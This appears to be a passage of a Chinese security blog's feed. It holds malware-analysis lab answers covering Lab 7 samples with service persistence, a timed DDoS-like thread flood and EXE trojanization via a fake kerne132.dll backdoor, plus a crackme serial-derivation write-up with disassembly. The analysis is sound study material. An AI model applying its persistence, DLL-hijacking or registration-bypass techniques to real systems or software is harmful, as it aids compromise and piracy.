id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;进程遍历&quot;&gt;&lt;a href=&quot;#进程遍历&quot; class=&quot;headerlink&quot; title=&quot;进程遍历&quot;&gt;&lt;/a&gt;进程遍历&lt;/h2&gt;&lt;p&gt;进程遍历就是遍历当前计算机上所有的进程信息，对于恶意代码来说，可以通过遍历获取进程的信息，可以通过这些信息来判断是否存在指定</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="功能技术" scheme="https://b1ackie.cn/tags/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验7</title>
    <link href="https://b1ackie.cn/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/"/>
    <id>https://b1ackie.cn/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/</id>
    <published>2021-08-16T06:50:45.000Z</published>
    <updated>2021-08-17T06:25:20.814Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-7-1"><a href="#Lab-7-1" class="headerlink" title="Lab 7-1"></a>Lab 7-1</h2><h3 id="1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？"><a href="#1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？" class="headerlink" title="1.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？"></a>1.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？</h3><p>创建了一个系统服务来随系统启动，可以看到StartServiceCtrlDispatcherA函数。其中还有一个结构 ServiceStartTable。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-1.png"></p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">typedef struct _SERVICE_TABLE_ENTRYA &#123;<br>  <span class="hljs-type">LPSTR</span>                    lpServiceName;<br>  <span class="hljs-type">LPSERVICE_MAIN_FUNCTIONA</span> lpServiceProc;<br>&#125; <span class="hljs-type">SERVICE_TABLE_ENTRYA</span>, *<span class="hljs-type">LPSERVICE_TABLE_ENTRYA</span>;<br></code></pre></div></td></tr></table></figure><p>这个服务的名称是Malservice，servicemain函数是sub_401040。</p><h3 id="2-为什么这个程序会使用一个互斥量？"><a href="#2-为什么这个程序会使用一个互斥量？" class="headerlink" title="2.为什么这个程序会使用一个互斥量？"></a>2.为什么这个程序会使用一个互斥量？</h3><p>程序创建了一个名为“HGL345”的互斥量。</p><p>这是为了防止运行多个程序，首先调用OpenMutexA函数尝试打开名为“HGL345”互斥量句柄，如果已经存在就代表程序已经在运行了，就会退出，如果没有就调用 CreateMutexA创建互斥量。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-2.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-3.png"></p><h3 id="3-可以用来检测这个程序的基于主机特征是什么？"><a href="#3-可以用来检测这个程序的基于主机特征是什么？" class="headerlink" title="3.可以用来检测这个程序的基于主机特征是什么？"></a>3.可以用来检测这个程序的基于主机特征是什么？</h3><p>名为”Malservice“的服务或者是”HGL345“互斥量。</p><h3 id="4-检测这个恶意代码的基于网络特征是什么？"><a href="#4-检测这个恶意代码的基于网络特征是什么？" class="headerlink" title="4.检测这个恶意代码的基于网络特征是什么？"></a>4.检测这个恶意代码的基于网络特征是什么？</h3><p>在StartAddress函数中，会有联网的行为，可以看到其中的agent信息和URL。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-4.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-5.png"></p><h3 id="5-这个程序的目的是什么？"><a href="#5-这个程序的目的是什么？" class="headerlink" title="5.这个程序的目的是什么？"></a>5.这个程序的目的是什么？</h3><p>首先是创建互斥量防止启动多个。然后是创建一个名为Malservice的服务。然后开始设置时间，将时间设置为了2100年的1月1日0点。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-6.png"></p><p>然后调用WaitForSingleObject进入等待，等到前面设置的时间2100年1月1日0点。然后创建二十个同样的线程，来访问<a href="http://www.malwareanalysisbook.com/">http://www.malwareanalysisbook.com</a></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-7.png"></p><p>可以理解为一个DDOS的恶意程序。</p><h3 id="6-这个程序什么时候完成执行？"><a href="#6-这个程序什么时候完成执行？" class="headerlink" title="6.这个程序什么时候完成执行？"></a>6.这个程序什么时候完成执行？</h3><p>不会完成执行，到2100年会创建20个线程，但是每个线程都是一个无线循环。</p><h2 id="Lab-7-2"><a href="#Lab-7-2" class="headerlink" title="Lab 7-2"></a>Lab 7-2</h2><h3 id="1-这个程序如何完成持久化驻留？"><a href="#1-这个程序如何完成持久化驻留？" class="headerlink" title="1.这个程序如何完成持久化驻留？"></a>1.这个程序如何完成持久化驻留？</h3><p>这个程序没有持久化驻留，执行一次完成后就会退出。</p><h3 id="2-这个程序的目的是什么？"><a href="#2-这个程序的目的是什么？" class="headerlink" title="2.这个程序的目的是什么？"></a>2.这个程序的目的是什么？</h3><p>程序首先初始化了COM，然后创建了一个COM对象。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-1.png"></p><p>其中rclsid的值如下图所示，类标识符，对应的是Internet Explorer。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-2.png"></p><p>riid接口标识符对应的是IWebBrowser2。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-3.png"></p><p>返回的COM对象保存在ppv中，会调用偏移为0x2C处的函数，而这个函数是Navigate函数，函数调用后，就会打开浏览器浏览“<a href="http://www.malwareanalysisbook.com/ad.html%E2%80%9D%EF%BC%8C%E4%B9%8B%E5%90%8E%E5%B0%B1%E6%98%AF%E4%B8%80%E4%BA%9B%E6%B8%85%E7%90%86%E5%B7%A5%E4%BD%9C%E3%80%82">http://www.malwareanalysisbook.com/ad.html”，之后就是一些清理工作。</a></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-4.png"></p><h3 id="3-这个程序什么时候完成执行？"><a href="#3-这个程序什么时候完成执行？" class="headerlink" title="3.这个程序什么时候完成执行？"></a>3.这个程序什么时候完成执行？</h3><p>当执行完访问页面之后就会结束。</p><h2 id="Lab-7-3"><a href="#Lab-7-3" class="headerlink" title="Lab 7-3"></a>Lab 7-3</h2><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p>先来分析一下DLL文件</p><p>使用IDA打开DLL文件，首先可以看到，尝试打开一个互斥对象，如果不存在就创建一个互斥对象，互斥对象名为SADFHUHF</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-1.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-2.png"></p><p>然后就是SOCKET通信的流程，关于通信的流程可以参考<a href="https://b1ackie.cn/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/">传输技术-SOCKET通信 </a>，这里地址是127.26.152.13：80，一个本地地址，真实情况肯定不会是一个本地的地址。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-3.png"></p><p>发送的信息是hello，然后会关闭这个send连接。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-4.png"></p><p>然后是recv函数接收信息，如果收到的信息是sleep就会调用sleep函数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-5.png"></p><p>如果收到的信息是exec就会调用CreateProcessA来启动一个进程。进程是lpCommandLine这个参数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-6.png"></p><p>看这个参数，看到是从第五个字节开始，而我们接收到的命令是exec XXXX，XXXX就是需要启动的进程。这是从远端发送过来的。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-7.png"></p><p>到这里基本上DLL就分析完毕了，再来分析一下EXE。</p><h3 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h3><p>分析一下EXE</p><p>要成功执行这个EXE还有一些限制，参数必须为WARNING_THIS_WILL_DESTROY_YOUR_MACHINE才可以执行这个程序。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-8.png"></p><p>像这样运行</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-9.png"></p><p>当满足条件后会开始运行程序，先创建了两个文件，C:\Windows\System32\kerne132.dll（注意这里不是“l”而是“1”）和Lab07-03.dll，还把它们映射到内存中。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-10.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-11.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-12.png"></p><p>再往下的代码比较多也比较复杂，我也没有过多分析，按照书上这部分是在比较内存、写入偏移或者写入内存。直接到后面来分析</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-13.png"></p><p>在进行完上述操作之后，先关闭句柄，然后复制文件，将Lab07-03.dll复制到C:</p><p>\Windows\System32\kerne132.dll，如果这个DLL已经存在的话，就不会调用4011E0这个函数，如果不存在复制过后就调用这个函数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-14.png"></p><p>来查看这个函数，它的参数是C:\*，进来之后它会调用FindFirstFileA和FindNextFileA来遍历所有的文件，然后判断文件类型是否为EXE，</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-15.png"></p><p>如果是exe的话，就会调用4010A0函数它会将文件映射到内存中，然后调用IsBadReadPtr验证调用进程是否具有对指定内存范围的读取访问权限。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-16.png"></p><p>然后检查加载的DLL中是否存在kernel32.dll，如果存在的话就会让kerne132.dll替换它。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-17.png"></p><p>打开process monitor监控行为，可以看到大量的文件操作。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-18.png"></p><p>打开一个calc.exe查看其加载的DLL，可以看到加载了kerne132.dll。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-19.png"></p><h3 id="1-这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？"><a href="#1-这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？" class="headerlink" title="1.这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？"></a>1.这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？</h3><p>在计算机中的每个EXE中都植入了一个DLL，相当于一个后门。</p><h3 id="2-这个恶意代码的两个明显的基于主机的特征是什么？"><a href="#2-这个恶意代码的两个明显的基于主机的特征是什么？" class="headerlink" title="2.这个恶意代码的两个明显的基于主机的特征是什么？"></a>2.这个恶意代码的两个明显的基于主机的特征是什么？</h3><p>一个是互斥量SADFHUHF，另一个是在C:\Windows\System32\文件夹下的kerne132.dll。</p><h3 id="3-这个程序的目的是什么？"><a href="#3-这个程序的目的是什么？" class="headerlink" title="3.这个程序的目的是什么？"></a>3.这个程序的目的是什么？</h3><p>搜索所有的EXE文件，并且让它们加载恶意的DLL文件kerne132.dll，这个DLL文件会进行一个SOCKET通信来执行操作，一个操作是sleep，另一个操作是会执行发送过来的进程，可能是恶意进程。</p><h3 id="4-一旦这个恶意代码被安装，你如何移除它？"><a href="#4-一旦这个恶意代码被安装，你如何移除它？" class="headerlink" title="4.一旦这个恶意代码被安装，你如何移除它？"></a>4.一旦这个恶意代码被安装，你如何移除它？</h3><p>如果安装，当前的exe文件都会加载这个恶意的DLL，可以写一个程序遍历所有的exe并且搜索其中的kerne132.dll，然后再用kernel.32替换它，或者复制kernel32.dll为kerne132.dll进行替换。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-7-1&quot;&gt;&lt;a href=&quot;#Lab-7-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 7-1&quot;&gt;&lt;/a&gt;Lab 7-1&lt;/h2&gt;&lt;h3 id=&quot;1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？&quot;&gt;&lt;a href=&quot;#1</summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-011</title>
    <link href="https://b1ackie.cn/2021/08/16/160CrackMe-011/"/>
    <id>https://b1ackie.cn/2021/08/16/160CrackMe-011/</id>
    <published>2021-08-16T06:06:45.000Z</published>
    <updated>2021-08-16T06:58:00.766Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序看到主界面，不可以输入任何字符，只可以点击下面的这个小键盘来进行输入，右边提示一个状态上面写着未注册，猜测成功的话这里应该会发生变化，下面开始分析一下。</p><p><img src="/2021/08/16/160CrackMe-011/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>无壳，使用VB语言编写</p><p><img src="/2021/08/16/160CrackMe-011/2.png"></p><p>使用OD，直接搜索字符串，就可以搜索到一大串类似注册码的字符串和REGISTRIERT。</p><p><img src="/2021/08/16/160CrackMe-011/3.png"></p><p>进入查看，可以看到在关键跳转前有一个比较，猜测应该是输入的内容经过一个计算之后与这个字符串进行比较。</p><p><img src="/2021/08/16/160CrackMe-011/4.png"></p><p>查看栈，可以看到当前输入123456计算出来的注册码</p><p><img src="/2021/08/16/160CrackMe-011/5.png"></p><p>开始寻找一下注册码的生成过程。</p><p>在跳转前面下断进行分析，可以看到流程是比较简单的，首先就是获取输入的第一位数字转为浮点数保存起来，然后每一位输入转为ascii码加上这个数字，第一位在前面加上一个0。也就是如果我们输入的是123456，那么我们输入的每一位字符都会加上数字1，也就是注册码第一位是0x31+1=0x32，然后是第一位所以要在前面加上一个0,就是032，第二位就是0x32+1=0x33,现在就是03233，以此类推就会生成前面图片中的字符串，0323334353637。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004048EB   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /Step8 = NULL</span><br>004048EC   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]          <span class="hljs-comment">; |</span><br>004048EF   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |/var18 = 005446A4</span><br>004048F0   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; ||retBuffer8 = 00530000</span><br>004048F1   .  89B5 4CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>],<span class="hljs-built_in">esi</span>          <span class="hljs-comment">; ||msvbvm60.__vbaStrVarVal</span><br>004048F7   .  89B5 3CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC4</span>],<span class="hljs-built_in">esi</span>          <span class="hljs-comment">; ||msvbvm60.__vbaStrVarVal</span><br>004048FD   .  FF15 <span class="hljs-number">30104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaLenVa&gt;<span class="hljs-comment">; |\__vbaLenVar</span><br><span class="hljs-number">00404903</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |End8 = 005446A4</span><br><span class="hljs-number">00404904</span>   .  8D95 3CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC4</span>]          <span class="hljs-comment">; |</span><br>0040490A   .  8D85 08FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xF8</span>]          <span class="hljs-comment">; |</span><br><span class="hljs-number">00404910</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Start8 = NULL</span><br><span class="hljs-number">00404911</span>   .  8D8D 18FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xE8</span>]          <span class="hljs-comment">; |</span><br><span class="hljs-number">00404917</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |TMPend8 = 005446A4</span><br><span class="hljs-number">00404918</span>   .  8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]          <span class="hljs-comment">; |</span><br>0040491B   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |TMPstep8 = 00530000</span><br>0040491C   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Counter8 = NULL</span><br><span class="hljs-number">0040491D</span>   .  FF15 <span class="hljs-number">38104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForInit</span><br><span class="hljs-number">00404923</span>   .  8B35 <span class="hljs-number">80104000</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaSt&gt;<span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span class="hljs-number">00404929</span>   .  8B1D B4104000 <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">617</span>&gt;]  <span class="hljs-comment">;  msvbvm60.rtcLeftCharVar</span><br>0040492F   &gt;  85C0          <span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br><span class="hljs-number">00404931</span>   .  0F84 <span class="hljs-number">29010000</span> <span class="hljs-keyword">je</span> Andréna<span class="hljs-number">.</span>00404A60<br><span class="hljs-number">00404937</span>   .  8D45 BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]<br>0040493A   .  6A <span class="hljs-number">01</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x1</span><br>0040493C   .  8D4D 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br>0040493F   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404940</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00404941</span>   .  FFD3          <span class="hljs-keyword">call</span> <span class="hljs-built_in">ebx</span>                                 <span class="hljs-comment">;  msvbvm60.rtcLeftCharVar</span><br><span class="hljs-number">00404943</span>   .  8D55 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">00404946</span>   .  8D45 B0       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x50</span>]<br><span class="hljs-number">00404949</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>0040494A   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040494B   .  FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span 